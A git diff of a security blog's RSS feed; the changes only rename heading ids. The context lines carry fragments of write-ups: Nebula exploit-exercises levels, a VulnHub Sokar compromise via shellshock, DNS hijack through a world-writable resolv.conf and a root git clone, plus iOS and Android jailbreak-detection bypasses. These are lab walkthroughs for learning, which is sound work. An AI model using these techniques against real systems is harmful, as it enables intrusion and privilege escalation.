+&lt;h2 id=&#34;level01&#34;&gt;level01&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level01/&#34;&gt;Level01&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1107,7 +1107,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level02:0683a5d670a26d450d97365e52610fb5&#34;&gt;level02&lt;/h2&gt;
+&lt;h2 id=&#34;level02&#34;&gt;level02&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level02/&#34;&gt;Level02&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1180,7 +1180,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level03:0683a5d670a26d450d97365e52610fb5&#34;&gt;level03&lt;/h2&gt;
+&lt;h2 id=&#34;level03&#34;&gt;level03&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level03/&#34;&gt;Level03&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1234,7 +1234,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level04:0683a5d670a26d450d97365e52610fb5&#34;&gt;level04&lt;/h2&gt;
+&lt;h2 id=&#34;level04&#34;&gt;level04&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level04/&#34;&gt;Level04&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1295,7 +1295,7 @@ flag04@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level05:0683a5d670a26d450d97365e52610fb5&#34;&gt;level05&lt;/h2&gt;
+&lt;h2 id=&#34;level05&#34;&gt;level05&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level05&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1343,7 +1343,7 @@ flag05@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level06:0683a5d670a26d450d97365e52610fb5&#34;&gt;level06&lt;/h2&gt;
+&lt;h2 id=&#34;level06&#34;&gt;level06&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level06&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1378,7 +1378,7 @@ flag06@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level07:0683a5d670a26d450d97365e52610fb5&#34;&gt;level07&lt;/h2&gt;
+&lt;h2 id=&#34;level07&#34;&gt;level07&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level07/&#34;&gt;Level07&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1455,7 +1455,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level08:0683a5d670a26d450d97365e52610fb5&#34;&gt;level08&lt;/h2&gt;
+&lt;h2 id=&#34;level08&#34;&gt;level08&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level08/&#34;&gt;Level08&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1506,7 +1506,7 @@ flag08@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level09:0683a5d670a26d450d97365e52610fb5&#34;&gt;level09&lt;/h2&gt;
+&lt;h2 id=&#34;level09&#34;&gt;level09&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level09/&#34;&gt;Level09&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1583,14 +1583,14 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;intermission:0683a5d670a26d450d97365e52610fb5&#34;&gt;intermission&lt;/h3&gt;
+&lt;h3 id=&#34;intermission&#34;&gt;intermission&lt;/h3&gt;
 
 &lt;p&gt;From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)&lt;/p&gt;
 
 &lt;p&gt;I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
 Lets get to them!&lt;/p&gt;
 
-&lt;h2 id=&#34;level10:0683a5d670a26d450d97365e52610fb5&#34;&gt;level10&lt;/h2&gt;
+&lt;h2 id=&#34;level10&#34;&gt;level10&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level10/&#34;&gt;Level10&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1728,7 +1728,7 @@ flag10@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level11:0683a5d670a26d450d97365e52610fb5&#34;&gt;level11&lt;/h2&gt;
+&lt;h2 id=&#34;level11&#34;&gt;level11&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level11/&#34;&gt;Level11&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1844,7 +1844,7 @@ int main(int argc, char **argv)
 
 &lt;p&gt;I&amp;rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute &lt;code&gt;getflag&lt;/code&gt; so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(&lt;/p&gt;
 
-&lt;h2 id=&#34;level12:0683a5d670a26d450d97365e52610fb5&#34;&gt;level12&lt;/h2&gt;
+&lt;h2 id=&#34;level12&#34;&gt;level12&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level12/&#34;&gt;Level12&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1902,7 +1902,7 @@ You have successfully executed getflag on a target account
 sh-4.2$
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level13:0683a5d670a26d450d97365e52610fb5&#34;&gt;level13&lt;/h2&gt;
+&lt;h2 id=&#34;level13&#34;&gt;level13&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level13/&#34;&gt;Level13&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1966,7 +1966,7 @@ flag13@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level14:0683a5d670a26d450d97365e52610fb5&#34;&gt;level14&lt;/h2&gt;
+&lt;h2 id=&#34;level14&#34;&gt;level14&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level14/&#34;&gt;Level14&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -2099,7 +2099,7 @@ flag14@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level15:0683a5d670a26d450d97365e52610fb5&#34;&gt;level15&lt;/h2&gt;
+&lt;h2 id=&#34;level15&#34;&gt;level15&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level15/&#34;&gt;Level15&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -2326,7 +2326,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level16:0683a5d670a26d450d97365e52610fb5&#34;&gt;level16&lt;/h2&gt;
+&lt;h2 id=&#34;level16&#34;&gt;level16&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level16/&#34;&gt;Level16&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -2415,7 +2415,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level17:0683a5d670a26d450d97365e52610fb5&#34;&gt;level17&lt;/h2&gt;
+&lt;h2 id=&#34;level17&#34;&gt;level17&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level17/&#34;&gt;Level17&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -2483,7 +2483,7 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level18:0683a5d670a26d450d97365e52610fb5&#34;&gt;level18&lt;/h2&gt;
+&lt;h2 id=&#34;level18&#34;&gt;level18&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level18/&#34;&gt;Level18&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -2768,7 +2768,7 @@ sh: start_pipeline: pgrp pipe: Too many open files
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level19:0683a5d670a26d450d97365e52610fb5&#34;&gt;level19&lt;/h2&gt;
+&lt;h2 id=&#34;level19&#34;&gt;level19&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level19/&#34;&gt;Level19&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -2853,20 +2853,20 @@ sh-4.2$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;conclusion:0683a5d670a26d450d97365e52610fb5&#34;&gt;conclusion&lt;/h2&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
 
 &lt;p&gt;Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&amp;hellip; ;)&lt;/p&gt;
 
 &lt;p&gt;As a final touch, my &amp;lsquo;loot&amp;rsquo; in &lt;code&gt;/var/tmp&lt;/code&gt; after finishing the last level:&lt;/p&gt;
 
-&lt;p&gt;
+
 &lt;figure &gt;
     
         &lt;img src=&#34;https://leonjza.github.io/images/nebula_done.png&#34; /&gt;
     
     
 &lt;/figure&gt;
-&lt;/p&gt;
+
 </description>
     </item>
     
@@ -2878,7 +2878,7 @@ You have successfully executed getflag on a target account
       <guid>https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:6256545d38ed18a4e5f3162703192bb4&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;http://blog.vulnhub.com/2015/01/vulnhub-is-0b10.html&#34;&gt;Vulnhub is 0b10&lt;/a&gt; years old. That is binary for 2 :) In order to celebrate this, &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt;
  created &lt;a href=&#34;https://www.vulnhub.com/entry/sokar-1,113/&#34;&gt;Sokar&lt;/a&gt;.&lt;/p&gt;
@@ -2900,7 +2900,7 @@ Of course, modifying the VM in order to help you get the flag (things like singl
 
 &lt;p&gt;Here is my entry for the competition. Enjoy! :)&lt;/p&gt;
 
-&lt;h2 id=&#34;a-usual-start:6256545d38ed18a4e5f3162703192bb4&#34;&gt;a usual start&lt;/h2&gt;
+&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;
 
 &lt;p&gt;You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire &lt;code&gt;nmap&lt;/code&gt; at it. I followed exactly these steps apart from using the usual &lt;code&gt;netdiscover&lt;/code&gt; to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.&lt;/p&gt;
 
@@ -2932,7 +2932,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds
 
 &lt;p&gt;One port open on tcp. &lt;code&gt;tcp/591&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;cgi-bin-cat:6256545d38ed18a4e5f3162703192bb4&#34;&gt;/cgi-bin/cat&lt;/h2&gt;
+&lt;h2 id=&#34;cgi-bin-cat&#34;&gt;/cgi-bin/cat&lt;/h2&gt;
 
 &lt;p&gt;The service on &lt;code&gt;tcp/591&lt;/code&gt; appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; to &lt;a href=&#34;http://192.168.217.163:591/cgi-bin/cat&#34;&gt;http://192.168.217.163:591/cgi-bin/cat&lt;/a&gt;. Requesting this page alone was the same stats, minus that creepy pink color ;)&lt;/p&gt;
 
@@ -2964,7 +2964,7 @@ uid=48(apache) gid=48(apache) groups=48(apache)
 
 &lt;p&gt;Yay. I was now able to execute commands as &lt;code&gt;apache&lt;/code&gt;. This allowed me to enumerate a great deal of the machine with relative ease.&lt;/p&gt;
 
-&lt;h2 id=&#34;making-life-easier:6256545d38ed18a4e5f3162703192bb4&#34;&gt;making life easier&lt;/h2&gt;
+&lt;h2 id=&#34;making-life-easier&#34;&gt;making life easier&lt;/h2&gt;
 
 &lt;p&gt;Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called &lt;code&gt;shock.py&lt;/code&gt;):&lt;/p&gt;
 
@@ -3072,7 +3072,7 @@ if __name__ == &amp;quot;__main__&amp;quot;:
     print &amp;quot; * Local &#39;%s&#39; transferred to remote &#39;%s&#39;&amp;quot; % (source, destination)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;egress-firewalls-le-suck:6256545d38ed18a4e5f3162703192bb4&#34;&gt;egress firewalls le-suck&lt;/h2&gt;
+&lt;h2 id=&#34;egress-firewalls-le-suck&#34;&gt;egress firewalls le-suck&lt;/h2&gt;
 
 &lt;p&gt;With the file transfer script done, I coded up a small &amp;lsquo;port scanner&amp;rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):&lt;/p&gt;
 
@@ -3131,7 +3131,7 @@ listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
 
 &lt;p&gt;I waited&amp;hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the &lt;code&gt;tcpdump&lt;/code&gt; had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.&lt;/p&gt;
 
-&lt;h2 id=&#34;bynarr-the-fruit:6256545d38ed18a4e5f3162703192bb4&#34;&gt;bynarr the fruit&lt;/h2&gt;
+&lt;h2 id=&#34;bynarr-the-fruit&#34;&gt;bynarr the fruit&lt;/h2&gt;
 
 &lt;p&gt;Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that &lt;code&gt;/home/bynarr&lt;/code&gt; was readable to me. In there was what looked like a kernel module &lt;code&gt;lime.ko&lt;/code&gt; and a script called &lt;code&gt;lime&lt;/code&gt; to &lt;code&gt;insmod&lt;/code&gt; it. Both were owned by root:&lt;/p&gt;
 
@@ -3259,7 +3259,7 @@ Password:
 uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;the-scary-linux-memory-extractor:6256545d38ed18a4e5f3162703192bb4&#34;&gt;the scary linux memory extractor&lt;/h2&gt;
+&lt;h2 id=&#34;the-scary-linux-memory-extractor&#34;&gt;the scary linux memory extractor&lt;/h2&gt;
 
 &lt;p&gt;With command access as &lt;code&gt;bynarr&lt;/code&gt; and remembering the mention of &lt;code&gt;tcp/51242&lt;/code&gt; outbound connectivity, I once more try and run the port scanner that got copied to &lt;code&gt;/tmp&lt;/code&gt;:&lt;/p&gt;
 
@@ -3356,7 +3356,7 @@ Use the &amp;quot;--show&amp;quot; option to display all of the cracked password
 
 &lt;p&gt;&lt;code&gt;apophis:overdrive&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;build-the-clone-to-the-hook:6256545d38ed18a4e5f3162703192bb4&#34;&gt;build the clone to the hook&lt;/h2&gt;
+&lt;h2 id=&#34;build-the-clone-to-the-hook&#34;&gt;build the clone to the hook&lt;/h2&gt;
 
 &lt;p&gt;To get command execution as &lt;code&gt;apophis.py&lt;/code&gt; I copied the &lt;code&gt;bynarr.py&lt;/code&gt; script to make &lt;code&gt;apophis.py&lt;/code&gt;, changing the username and the password.&lt;/p&gt;
 
@@ -3412,7 +3412,7 @@ Build? (Y/N)
 
 &lt;p&gt;The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to &lt;code&gt;/mnt/secret-project&lt;/code&gt; from &lt;code&gt;sokar-dev&lt;/code&gt; which does not resolve.&lt;/p&gt;
 
-&lt;h3 id=&#34;the-impossible-b0f:6256545d38ed18a4e5f3162703192bb4&#34;&gt;the impossible b0f&lt;/h3&gt;
+&lt;h3 id=&#34;the-impossible-b0f&#34;&gt;the impossible b0f&lt;/h3&gt;
 
 &lt;p&gt;I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to &lt;code&gt;build.&lt;/code&gt;:&lt;/p&gt;
 
@@ -3592,7 +3592,7 @@ gdb-peda$
 
 &lt;p&gt;Right before this call though, there is a instruction to &lt;code&gt;call   0x5555555547a0 &amp;lt;setreuid@plt&amp;gt;&lt;/code&gt; to set the UID to 0. So, this brought me to the conclusion that &lt;code&gt;build&lt;/code&gt; is running &lt;code&gt;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&lt;/code&gt; as &lt;code&gt;root&lt;/code&gt;. But what is so special about this?&lt;/p&gt;
 
-&lt;h3 id=&#34;inspecting-git:6256545d38ed18a4e5f3162703192bb4&#34;&gt;inspecting git&lt;/h3&gt;
+&lt;h3 id=&#34;inspecting-git&#34;&gt;inspecting git&lt;/h3&gt;
 
 &lt;p&gt;I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a &lt;code&gt;git clone&lt;/code&gt; as root? One of my first theories was that if I could get &lt;code&gt;sokar-dev&lt;/code&gt; to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions &lt;code&gt;git&lt;/code&gt; will honor really is the symlink and executable bits :(&lt;/p&gt;
 
@@ -3640,7 +3640,7 @@ git version 2.2.0
 
 &lt;p&gt;Great. &lt;code&gt;git&lt;/code&gt; version 2.2.1 fixed this bug so we are in luck.&lt;/p&gt;
 
-&lt;h2 id=&#34;rooting-sokar:6256545d38ed18a4e5f3162703192bb4&#34;&gt;rooting sokar&lt;/h2&gt;
+&lt;h2 id=&#34;rooting-sokar&#34;&gt;rooting sokar&lt;/h2&gt;
 
 &lt;p&gt;All of this information was great to have, but it still had one major problem. How can I clone a repository &lt;strong&gt;I&lt;/strong&gt; own? I made &lt;em&gt;countless&lt;/em&gt; attempts to try fool the environment into resolving &lt;code&gt;sokar-dev&lt;/code&gt; to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &amp;lsquo;cleans up&amp;rsquo; the environment, especially for reasons such as this one.&lt;/p&gt;
 
@@ -3655,7 +3655,7 @@ Password:
 
 &lt;p&gt;&lt;code&gt;/etc/resolv.conf&lt;/code&gt; is &lt;strong&gt;world writable&lt;/strong&gt;. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D&lt;/p&gt;
 
-&lt;h3 id=&#34;preparing-the-environment-and-exploit:6256545d38ed18a4e5f3162703192bb4&#34;&gt;preparing the environment and exploit&lt;/h3&gt;
+&lt;h3 id=&#34;preparing-the-environment-and-exploit&#34;&gt;preparing the environment and exploit&lt;/h3&gt;
 
 &lt;p&gt;I decided to use &lt;code&gt;dnsmasq&lt;/code&gt; for a quick to setup DNS server. I added a line to &lt;code&gt;/etc/dnsmasq.hosts&lt;/code&gt; to answer a query for &lt;code&gt;sokar-dev&lt;/code&gt;:&lt;/p&gt;
 
@@ -3851,7 +3851,7 @@ cat /root/flag
 [root@sokar secret-project]#
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;conclusion:6256545d38ed18a4e5f3162703192bb4&#34;&gt;conclusion&lt;/h2&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
 
 &lt;p&gt;What a blast! Them feels of r00t are so &lt;em&gt;gooood&lt;/em&gt;. For the curios, that firewall that was making life so difficult:&lt;/p&gt;
 
@@ -3877,7 +3877,7 @@ cat /etc/sysconfig/iptables
 COMMIT
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;edit:6256545d38ed18a4e5f3162703192bb4&#34;&gt;edit&lt;/h2&gt;
+&lt;h2 id=&#34;edit&#34;&gt;edit&lt;/h2&gt;
 
 &lt;p&gt;I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the &lt;code&gt;lime&lt;/code&gt; script run with &lt;code&gt;sudo&lt;/code&gt; can be shocked too!&lt;/p&gt;
 
@@ -3925,7 +3925,7 @@ print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, h
       <guid>https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:13a45ed3377ed5d26650846aced5e9e5&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;Not too long ago, I toyed with a &lt;a href=&#34;https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/&#34;&gt;Android root detection bypass&lt;/a&gt;. In a similar scenario, I was poking at a iOS application that also had some root detection built in. For very much the same purpose, I suppose the application has its own ~reasons~ for the jailbreak detection. Of course, this makes the testing I &lt;em&gt;actually&lt;/em&gt; wanted to do impossible as I&amp;rsquo;d very much like to dig under the hood :)&lt;/p&gt;
 
@@ -3941,13 +3941,13 @@ print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, h
 &lt;p&gt;So, its was time to try and bypass the jailbreak detection of the application.
 All I had to work with was a &lt;code&gt;.ipa&lt;/code&gt;. Similar to the android &lt;code&gt;.apk&lt;/code&gt; file, the &lt;code&gt;.ipa&lt;/code&gt; is also just a zipped up archive of the actual application files. To test with, I had a iPad mini. The iPad was running the latest iOS (8.1.2 at the time of this post) and was also jailbroken. If I remember correctly the jailbreak tool used was called TaiG. Anyways, inside the applications &lt;code&gt;.ipa&lt;/code&gt; archive was a whole bunch of resource files and what not, including the compiled application executable. This executable is what is of interest.&lt;/p&gt;
 
-&lt;h2 id=&#34;understanding-the-behavior:13a45ed3377ed5d26650846aced5e9e5&#34;&gt;understanding the behavior&lt;/h2&gt;
+&lt;h2 id=&#34;understanding-the-behavior&#34;&gt;understanding the behavior&lt;/h2&gt;
 
 &lt;p&gt;I installed the app onto my iPad, and started to inspect its behavior. When the application starts, it would immediately throw a security related error, notifying the user that it has detected the environment as one that is jailbroken. This happens pretty fast too. Once the jailbreak detection error shows, the application refuses to continue to run. Restarting the application simply continues this loop.&lt;/p&gt;
 
 &lt;p&gt;I studied some iOS jailbreak detection methods online which revealed many of them as being pretty obvious. From detecting the presence of &lt;code&gt;/bin/bash&lt;/code&gt; or &lt;code&gt;Cydia.app&lt;/code&gt;, to examining the exit status if &lt;code&gt;fork()&lt;/code&gt;. There are some more advanced methods as well such as checking the existence of certain known &lt;a href=&#34;https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/DynamicLibraryUsageGuidelines.html&#34;&gt;dylib&lt;/a&gt;&amp;rsquo;s too (which apparently is the hardest to circumvent). For the purpose of this post, the jailbreak detection was pretty weak and did not have any of the more advanced methods implemented. In fact, I am pretty sure there won’t be that many apps out there that will be this easy to bypass.&lt;/p&gt;
 
-&lt;h2 id=&#34;discovering-the-implementation:13a45ed3377ed5d26650846aced5e9e5&#34;&gt;discovering the implementation&lt;/h2&gt;
+&lt;h2 id=&#34;discovering-the-implementation&#34;&gt;discovering the implementation&lt;/h2&gt;
 
 &lt;p&gt;Armed with some knowledge of how its typically done in the iOS world, I proceeded to take a look at the actual application binary:&lt;/p&gt;
 
@@ -3981,7 +3981,7 @@ myApplication: Mach-O executable arm
 
 &lt;p&gt;As can be seen in the above screenshot, the &lt;code&gt;fileExistsAtPath&lt;/code&gt; for &lt;code&gt;/Applications/Cydia.app&lt;/code&gt; is hardly something I would have expected in a &lt;code&gt;isRetinaDisplay&lt;/code&gt; implementation :P&lt;/p&gt;
 
-&lt;h2 id=&#34;planning-an-attack:13a45ed3377ed5d26650846aced5e9e5&#34;&gt;planning an attack&lt;/h2&gt;
+&lt;h2 id=&#34;planning-an-attack&#34;&gt;planning an attack&lt;/h2&gt;
 
 &lt;p&gt;At this stage, I was fairly certain that I had found the code I was looking for. From the method name &lt;em&gt;isRetinaDisplay&lt;/em&gt;, I reasoned a little and guessed that this was actually supposed to say &lt;code&gt;isJailBroken&lt;/code&gt;. I want this method to return false. My mind went straight to getting &lt;a href=&#34;http://www.cycript.org/&#34;&gt;cycript&lt;/a&gt; ready for some &lt;a href=&#34;http://iphonedevwiki.net/index.php/Cycript_Tricks&#34;&gt;method swizzling&lt;/a&gt;. I started to set things up and played around a little, when I realized that I don&amp;rsquo;t think I will be able to manipulate the runtime fast enough for this to work. Remember, the first thing the app does is check the jailbreak status.&lt;/p&gt;
 
@@ -3989,7 +3989,7 @@ myApplication: Mach-O executable arm
 
 &lt;p&gt;Considering &lt;em&gt;how&lt;/em&gt; the jailbreak detection works, most of the ways that I saw in the application were related to file existence checks. There was also an attempt to write to &lt;code&gt;/private/jailbreak.txt&lt;/code&gt;, as well as open a &lt;code&gt;cydia://&lt;/code&gt; url. I realized that I could probably just change these strings to things that will inherently fail and cause the method to not return true for any of the checks.&lt;/p&gt;
 
-&lt;h2 id=&#34;in-1992-we-had-hex-editors-too:13a45ed3377ed5d26650846aced5e9e5&#34;&gt;in 1992 we had hex editors too&lt;/h2&gt;
+&lt;h2 id=&#34;in-1992-we-had-hex-editors-too&#34;&gt;in 1992 we had hex editors too&lt;/h2&gt;
 
 &lt;p&gt;I ssh&amp;rsquo;d into my iPad and located the applications installed directory. Once I had found this, I &lt;code&gt;scp&lt;/code&gt;&amp;rsquo;d the compiled binary to my kali linux install, and opened it in a hex editor. I realized later I could have probably just used the binary I already had locally :P&lt;/p&gt;
 
@@ -4018,7 +4018,7 @@ myApplication: Mach-O executable arm
 
 &lt;p&gt;I saved the modifications that I had done, and &lt;code&gt;scp&lt;/code&gt;&amp;rsquo;d the binary back to my iPad to the folder where it was installed. I literally just overwrote the existing binary. At this stage I figured I will most certainly have some form of signing related problem as the binary has been tampered with. Well, this was not the case. Instead, I no longer was greeted with the lame jailbreak security error :P&lt;/p&gt;
 
-&lt;h2 id=&#34;summary:13a45ed3377ed5d26650846aced5e9e5&#34;&gt;summary&lt;/h2&gt;
+&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
 
 &lt;p&gt;In the end, it was pretty easy to find the jailbreak detection code. Deducing a few things based on the disassembly made it easy to find the method responsible for the checks, regardless of the attempt to hide it via a name change. Furthermore, using something as simple as a hex editor, a trivial implementation such as this was very easily bypassed :)&lt;/p&gt;
 </description>
@@ -4032,7 +4032,7 @@ myApplication: Mach-O executable arm
       <guid>https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-app-reversing-and-smali-patching/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:f0c467d8e3464f63b945a49a8c9a31f0&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;I will start by saying that I am by &lt;em&gt;no means&lt;/em&gt; a expert in anything you are about to read. I am also not 100% sure about the correct terminology for this type of patching. Maybe it should have been called binary patching? I don&amp;rsquo;t know, but I do know that I was quite literally shocked by the ease of getting this job done, and figured its time to make some notes for me to reflect on later again.&lt;/p&gt;
 
@@ -4047,13 +4047,13 @@ myApplication: Mach-O executable arm
 
